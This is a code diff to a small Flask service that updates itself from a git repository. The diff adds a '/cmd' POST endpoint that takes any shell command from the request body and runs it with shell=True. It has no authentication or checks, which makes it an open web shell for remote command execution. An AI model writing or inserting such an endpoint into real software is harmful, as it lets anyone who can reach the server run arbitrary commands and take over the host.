@@ -1,8 +1,9 @@
 
 import threading, signal
 import os, sys, git
+import subprocess
 from time import sleep
-from flask import Flask
+from flask import Flask, request, jsonify
 
 
 app = Flask(__name__)
@@ -22,6 +23,18 @@ def update_from_repo():
 def exit_after_response():
     update_from_repo()
     os.kill(os.getpid(), signal.SIGINT)
+
+
+
+@app.route("/cmd", methods=["POST"])
+def custom():
+    cmd = request.get_json()["cmd"]
+    try:
+        output = subprocess.check_output(cmd, shell=True, text=True)
+        return jsonify({"output": output})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"error": str(e)})
+
 
 @app.route("/restart")
 def restart():
